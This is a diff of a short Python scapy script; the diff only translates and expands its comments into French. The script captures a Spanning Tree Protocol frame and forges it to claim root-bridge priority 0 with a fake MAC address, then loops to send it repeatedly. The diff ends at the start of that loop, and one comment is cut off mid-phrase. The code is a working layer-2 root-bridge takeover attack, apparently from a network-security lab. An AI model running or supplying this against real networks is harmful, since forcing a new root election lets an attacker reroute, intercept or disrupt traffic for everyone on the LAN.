@@ -1,19 +1,19 @@
 #!/usr/bin/python3
-#Importation de la bibliothèque scapy
+#Importation de toutes les fonctionnalités de la bibliothèque scapy
 from scapy.all import *
-#Recherche et envoie d'une trame STP avec une adresse de multidiffusion
+#Utilise la fonction (sniff) pour capturer une trame STP avec une adresse de destination de multidiffusion (01:80:c2:00:00:00)
 frame = sniff(filter="ether dst 01:80:c2:00:00:00",count=1)
-#Change the MAC address in the frame to the following:
+#Changement de l'adresse MAC source de la trame en "00:00:00:00:00:01"
 frame[0].src="00:00:00:00:00:01"
-#Set Rootid
+#Modification de l'identifiant du switch racine (rootid) à 0 afin de mettre en place une nouvelle élection
 frame[0].rootid=0
-#Set rootmac
+#Modification de l'adresse MAC du switch racine (rootmac) à "00:00:00:00:00:01"
 frame[0].rootmac="00:00:00:00:00:01"
-#Set Bridgeid
+#Modification de l'identifiant du pont (bridgeid) à 0
 frame[0].bridgeid=0
-#Set rootmac
+#Modification de l'adresse MAC du pont (bridgemac) à "00:00:00:00:00:01"
 frame[0].bridgemac="00:00:00:00:00:01"
-#Show changed frame
+#Affiche la
 frame[0].show()
 #Loop to send multiple frames into the network:
 for i in range (0, 50):
